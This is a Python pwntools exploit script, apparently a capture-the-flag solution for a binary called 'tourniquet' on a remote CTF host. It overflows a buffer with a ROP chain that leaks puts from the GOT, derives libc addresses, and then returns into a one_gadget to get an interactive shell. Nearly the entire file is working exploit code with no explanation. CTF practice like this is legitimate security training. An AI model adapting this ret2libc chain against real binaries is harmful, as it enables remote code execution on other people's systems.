from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './tourniquet'
HOST = 'remote2.thcon.party'
# HOST = '172.17.0.2'
PORT =  10901

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

rdi = 0x4006d3

r = start()
while(1):
	r = start()
	payload = ''
	payload += flat(rdi+1) * 3
	payload += flat(rdi, elf.got.puts, elf.sym.puts, elf.sym.main+1)
	payload = payload.ljust(64, 'A')
	r.sendlineafter('?\n', payload[:-1])

	try: 
		leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
		break
	except:
		r.close()
if args.D:
	debug(r, [0x624])

dbg('leak')
pause()
base = leak - 0x80aa0
system = base + 0x4f550
binsh  = base + 0x1b3e1a
one = [0x4f432, 0x10a41c, 0xe5617]
payload = ''
payload = payload.ljust(0x28, '\x11')
payload += flat(0x601000+0x800, base + one[2], 0)
r.sendlineafter('?\n', payload[:-1])

r.interactive()
r.close()
